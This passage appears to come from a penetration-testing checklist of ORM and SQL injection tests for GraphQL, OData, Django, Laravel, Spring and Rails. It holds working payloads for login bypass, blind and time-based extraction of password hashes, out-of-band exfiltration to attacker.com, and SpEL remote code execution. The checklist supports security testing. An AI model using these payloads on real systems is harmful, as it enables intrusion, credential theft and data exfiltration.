## ORM-115 — ORM Injection - Nested Function Bypass
**Test Category:** ORM Bypass Techniques · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** ORM filter inputs

**Test Steps:** Use nested/alternative SQL functions to bypass function blacklists

**Expected Result:** Function filter bypassed

**Payload Example:**

```
CONCAT(CHR(65),CHR(66)) instead of string literal
```

**Impact:** ORM sanitizer bypass reaching the underlying SQL/NoSQL engine

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-116 — ORM Injection - NULL Byte Injection
**Test Category:** ORM Bypass Techniques · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** ORM filter inputs

**Test Steps:** Insert NULL byte to terminate string processing early

**Expected Result:** Input filter bypassed

**Payload Example:**

```
admin%00' OR 1=1--
```

**Impact:** ORM sanitizer bypass reaching the underlying SQL/NoSQL engine

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-117 — ORM Injection - HTTP Parameter Pollution
**Test Category:** ORM Bypass Techniques · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Send same parameter multiple times to confuse ORM parameter binding

**Expected Result:** One value checked by filter, another processed by ORM

**Payload Example:**

```
?name=safe&name=' OR 1=1--
```

**Impact:** ORM sanitizer bypass reaching the underlying SQL/NoSQL engine

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-118 — ORM Injection - Content-Type Switching
**Test Category:** ORM Bypass Techniques · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Any API endpoint

**Test Steps:** Switch Content-Type (JSON↔form↔XML) to bypass type-specific input validation

**Expected Result:** Parser-specific bypass achieves injection

**Payload Example:**

```
Switch from application/json to application/x-www-form-urlencoded
```

**Impact:** ORM sanitizer bypass reaching the underlying SQL/NoSQL engine

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-119 — GraphQL + ORM - Filter Argument Injection
**Test Category:** GraphQL ORM Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GraphQL endpoints

**Test Steps:** Inject ORM operators into GraphQL query filter arguments

**Expected Result:** ORM query modified via GraphQL filter

**Payload Example:**

```
query { users(filter: {role: {eq: "admin"}}) { password } }
```

**Impact:** GraphQL-to-ORM injection: filter args reach DB unsanitized

**Tools:** Burp Suite, GraphQL Voyager, InQL

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-120 — GraphQL + ORM - Nested Resolver Injection
**Test Category:** GraphQL ORM Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** GraphQL endpoints

**Test Steps:** Exploit nested resolvers that pass arguments directly to ORM queries

**Expected Result:** Data from related models extracted

**Payload Example:**

```
query { user(id:1) { posts { secretContent } } }
```

**Impact:** GraphQL-to-ORM injection: filter args reach DB unsanitized

**Tools:** InQL, Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-121 — GraphQL + ORM - Batch Query ORM DoS
**Test Category:** GraphQL ORM Injection · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** GraphQL endpoints

**Test Steps:** Send deeply nested or batch queries that trigger expensive ORM operations

**Expected Result:** Server DoS via expensive ORM queries

**Payload Example:**

```
query { users { posts { comments { user { posts { comments }}}}}}
```

**Impact:** GraphQL-to-ORM injection: filter args reach DB unsanitized

**Tools:** GraphQL cop, Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-122 — OData + ORM - $filter Injection
**Test Category:** OData ORM Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** REST API with OData

**Test Steps:** Inject OData filter expressions that map to unsafe ORM queries

**Expected Result:** ORM query manipulated via OData filter

**Payload Example:**

```
GET /api/users?$filter=Role eq 'admin'
```

**Impact:** OData $filter injection mapped to ORM query, DB exposure

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-123 — OData + ORM - $expand Injection
**Test Category:** OData ORM Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** REST API with OData

**Test Steps:** Use $expand to include sensitive related entities

**Expected Result:** Sensitive relations exposed

**Payload Example:**

```
GET /api/users?$expand=Secrets,CreditCards
```

**Impact:** OData $filter injection mapped to ORM query, DB exposure

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-124 — OData + ORM - $select Injection
**Test Category:** OData ORM Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** REST API with OData

**Test Steps:** Use $select to include sensitive fields

**Expected Result:** Password hash or tokens exposed

**Payload Example:**

```
GET /api/users?$select=PasswordHash,ApiToken
```

**Impact:** OData $filter injection mapped to ORM query, DB exposure

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-125 — ORM Auth Bypass - Always True Condition
**Test Category:** Authentication Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Any login endpoint

**Test Steps:** Inject ORM-specific always-true conditions into login

**Expected Result:** Authentication bypassed

**Payload Example:**

```
Various: ' OR 1=1-- / {$ne:''} / OR ''=''
```

**Impact:** ORM injection in auth query: login without valid credentials

**Tools:** Burp Suite, custom scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-126 — ORM Auth Bypass - Token Extraction via Blind Injection
**Test Category:** Authentication Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Password reset

**Test Steps:** Extract password reset token via blind ORM injection character by character

**Expected Result:** Reset token extracted

**Payload Example:**

```
token[$regex]=^a... (iterate)
```

**Impact:** ORM injection in auth query: login without valid credentials

**Tools:** Custom script, Burp Intruder

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-127 — ORM Auth Bypass - API Key Bypass via Operator Injection
**Test Category:** Authentication Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API key validation

**Test Steps:** Inject comparison operators on API key field

**Expected Result:** API key validation bypassed

**Payload Example:**

```
apiKey[$ne]=invalidkey
```

**Impact:** ORM injection in auth query: login without valid credentials

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-128 — Blind ORM Injection - Response Length Differential
**Test Category:** Blind Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Compare response content-length between true and false conditions

**Expected Result:** Consistent length differential confirms blind injection

**Payload Example:**

```
true: ' AND 1=1-- / false: ' AND 1=2--
```

**Impact:** Blind boolean extraction of DB data via ORM predicate injection

**Tools:** Burp Comparer, Intruder

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-129 — Blind ORM Injection - Response Status Code Differential
**Test Category:** Blind Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Check if different conditions produce different HTTP status codes

**Expected Result:** 200 vs 500 confirms injection

**Payload Example:**

```
' AND 1=1-- (200) vs ' AND 1=0-- (500)
```

**Impact:** Blind boolean extraction of DB data via ORM predicate injection

**Tools:** Burp Intruder

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-130 — Blind ORM Injection - Character-by-Character Extraction
**Test Category:** Blind Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use SUBSTRING/MID/SUBSTR with boolean conditions to extract data one char at a time

**Expected Result:** Data extracted character by character

**Payload Example:**

```
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a
```

**Impact:** Blind boolean extraction of DB data via ORM predicate injection

**Tools:** sqlmap, custom script

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-131 — Blind ORM Injection - Binary Search Extraction
**Test Category:** Blind Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use &gt; / &lt; comparisons with ASCII values to extract data via binary search

**Expected Result:** Faster extraction using binary search

**Payload Example:**

```
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77--
```

**Impact:** Blind boolean extraction of DB data via ORM predicate injection

**Tools:** sqlmap --technique=B

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-132 — Time-Based ORM Injection - pg_sleep (PostgreSQL)
**Test Category:** Time-Based Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Inject pg_sleep() and measure response time

**Expected Result:** Response delayed by specified duration

**Payload Example:**

```
' AND (SELECT pg_sleep(5))-- / '; SELECT pg_sleep(5)--
```

**Impact:** Time-based blind extraction via ORM-injected sleep primitives

**Tools:** sqlmap --technique=T, Burp

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-133 — Time-Based ORM Injection - SLEEP() (MySQL)
**Test Category:** Time-Based Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Inject SLEEP() and measure response time

**Expected Result:** Response delayed by specified duration

**Payload Example:**

```
' AND SLEEP(5)-- / ' OR SLEEP(5)--
```

**Impact:** Time-based blind extraction via ORM-injected sleep primitives

**Tools:** sqlmap --technique=T

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-134 — Time-Based ORM Injection - WAITFOR DELAY (MSSQL)
**Test Category:** Time-Based Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Inject WAITFOR DELAY and measure response time

**Expected Result:** Response delayed by specified duration

**Payload Example:**

```
'; WAITFOR DELAY '0:0:5'--
```

**Impact:** Time-based blind extraction via ORM-injected sleep primitives

**Tools:** sqlmap --technique=T

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-135 — Time-Based ORM Injection - Conditional Time Delay
**Test Category:** Time-Based Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Inject conditional time delay to extract data bit by bit

**Expected Result:** Delay occurs only for true condition

**Payload Example:**

```
' AND IF(1=1,SLEEP(5),0)-- vs ' AND IF(1=2,SLEEP(5),0)--
```

**Impact:** Time-based blind extraction via ORM-injected sleep primitives

**Tools:** sqlmap, custom script

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-136 — OOB ORM Injection - DNS Exfiltration (MySQL)
**Test Category:** Out-of-Band Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use LOAD_FILE() or similar to trigger DNS lookup with extracted data

**Expected Result:** DNS callback received with extracted data

**Payload Example:**

```
' AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--
```

**Impact:** OOB exfiltration (DNS/HTTP) of DB data via ORM injection

**Tools:** Burp Collaborator, interactsh

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-137 — OOB ORM Injection - DNS Exfiltration (MSSQL)
**Test Category:** Out-of-Band Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use xp_dirtree/xp_fileexist to trigger DNS with data

**Expected Result:** DNS callback received

**Payload Example:**

```
'; EXEC xp_dirtree '\\\\'+@@version+'.attacker.com\\a'--
```

**Impact:** OOB exfiltration (DNS/HTTP) of DB data via ORM injection

**Tools:** Burp Collaborator, interactsh

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-138 — OOB ORM Injection - HTTP Exfiltration (PostgreSQL)
**Test Category:** Out-of-Band Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use dblink or COPY TO to make HTTP request with data

**Expected Result:** HTTP callback received with data

**Payload Example:**

```
'; SELECT dblink_send_query('host=attacker.com','SELECT version()')--
```

**Impact:** OOB exfiltration (DNS/HTTP) of DB data via ORM injection

**Tools:** Burp Collaborator, interactsh

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-139 — OOB ORM Injection - XXE-based via Oracle
**Test Category:** Out-of-Band Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Any ORM endpoint

**Test Steps:** Use Oracle XMLType to make HTTP request

**Expected Result:** HTTP request triggers with data

**Payload Example:**

```
' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--
```

**Impact:** OOB exfiltration (DNS/HTTP) of DB data via ORM injection

**Tools:** Burp Collaborator

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-140 — Error-Based ORM Injection - Type Conversion Error
**Test Category:** Error-Based Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ORM error responses

**Test Steps:** Force type conversion error that includes data in error message

**Expected Result:** Data leaked in error message

**Payload Example:**

```
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
```

**Impact:** Error-based data extraction through ORM error propagation

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-141 — Error-Based ORM Injection - ExtractValue/UpdateXML (MySQL)
**Test Category:** Error-Based Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ORM error responses

**Test Steps:** Use XML functions to force error containing data

**Expected Result:** Data in error message

**Payload Example:**

```
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--
```

**Impact:** Error-based data extraction through ORM error propagation

**Tools:** sqlmap --technique=E

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-142 — Error-Based ORM Injection - RAISE_APPLICATION_ERROR (Oracle)
**Test Category:** Error-Based Extraction · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** ORM error responses

**Test Steps:** Use Oracle error raising to leak data

**Expected Result:** Data in ORA error message

**Payload Example:**

```
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT password FROM users WHERE rownum=1))--
```

**Impact:** Error-based data extraction through ORM error propagation

**Tools:** sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-143 — DRF - django-filter Lookup Injection
**Test Category:** Framework-Specific · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Django REST Framework filters

**Test Steps:** Exploit django-filter's automatic lookup generation to use unintended lookups

**Expected Result:** Unintended queryset filtering

**Payload Example:**

```
GET /api/users/?password__startswith=pbkdf2 (iterate to extract hash)
```

**Impact:** Framework-specific ORM weakness enabling query manipulation

**Tools:** Burp Intruder, custom script

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-144 — DRF - SearchFilter Field Injection
**Test Category:** Framework-Specific · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Django REST Framework

**Test Steps:** Inject field names into DRF SearchFilter's search parameter

**Expected Result:** Search across sensitive fields

**Payload Example:**

```
GET /api/users/?search=admin&search_fields=password
```

**Impact:** Framework-specific ORM weakness enabling query manipulation

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-145 — DRF - OrderingFilter Injection
**Test Category:** Framework-Specific · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Django REST Framework

**Test Steps:** Inject sensitive field names into ordering parameter

**Expected Result:** Ordering by sensitive fields reveals data patterns

**Payload Example:**

```
GET /api/users/?ordering=password (observe order)
```

**Impact:** Framework-specific ORM weakness enabling query manipulation

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-146 — Laravel - Request Merge/Input Injection
**Test Category:** Framework-Specific · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Laravel API endpoints

**Test Steps:** Exploit Laravel's request()-&gt;all() or request()-&gt;input() to inject model attributes

**Expected Result:** Mass assignment via request input injection

**Payload Example:**

```
POST with _method=PUT&role=admin
```

**Impact:** Framework-specific ORM weakness enabling query manipulation

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-147 — Spring Data REST - SpEL Injection via ORM
**Test Category:** Framework-Specific · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Spring Data REST

**Test Steps:** Inject Spring Expression Language in parameters that reach ORM layer

**Expected Result:** Remote code execution via SpEL

**Payload Example:**

```
${T(java.lang.Runtime).getRuntime().exec('id')}
```

**Impact:** Framework-specific ORM weakness enabling query manipulation

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-148 — Spring Data JPA - @Query Annotation Injection
**Test Category:** Framework-Specific · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Spring Data JPA

**Test Steps:** Inject into JPQL/HQL in @Query annotation if parameters are concatenated

**Expected Result:** JPQL/HQL injection

**Payload Example:**

```
q=' OR 1=1--
```

**Impact:** Framework-specific ORM weakness enabling query manipulation

**Tools:** Burp Suite, sqlmap

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-149 — Spring Data JPA - Specification API Injection
**Test Category:** Framework-Specific · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Spring Data JPA

**Test Steps:** Inject into JPA Specifications if criteria built from user input unsafely

**Expected Result:** Query criteria manipulation

**Payload Example:**

```
filter[role]=admin&filter[op]=eq
```

**Impact:** Framework-specific ORM weakness enabling query manipulation

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-150 — Rails - Arel Injection
**Test Category:** Framework-Specific · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rails endpoints

**Test Steps:** Inject SQL via Arel nodes if user input creates Arel expressions

**Expected Result:** SQL injection through Arel

**Payload Example:**

```
sort=Arel.sql('1;SELECT pg_sleep(5)')
```

**Impact:** Framework-specific ORM weakness enabling query manipulation

**Tools:** Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-151 — Rails - Ransack Search Injection
**Test Category:** Framework-Specific · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rails endpoints

**Test Steps:** Exploit Ransack's predicate-based search to access sensitive fields

**Expected Result:** Unauthorized field access / data extraction

**Payload Example:**

```
q[password_cont]=abc&q[s]=password+asc
```

**Impact:** Framework-specific ORM weakness enabling query manipulation

**Tools:** Burp Suite, Intruder

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger Academy SQL injection; PayloadsAllTheThings (SQLi/HQL/ORM Leak); OWASP Testing Guide (ORM Injection); framework security advisories (Hibernate/Django/Sequelize/Rails)

---

## ORM-152 — Rails - strong_parameters Bypass
**Test Category:** Framework-Specific · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rails endpoints

**Test Steps:** Attempt to bypass strong_parameters by using nested attributes or array params

**Expected Result:** Mass assignment despite strong_parameters

**Payload Example:**

```
user[role]=admin / user[admin_attributes][level]=super
```

**Impact:** Framework-specific ORM weakness enabling query manipulation

**Tools:** Burp Suite

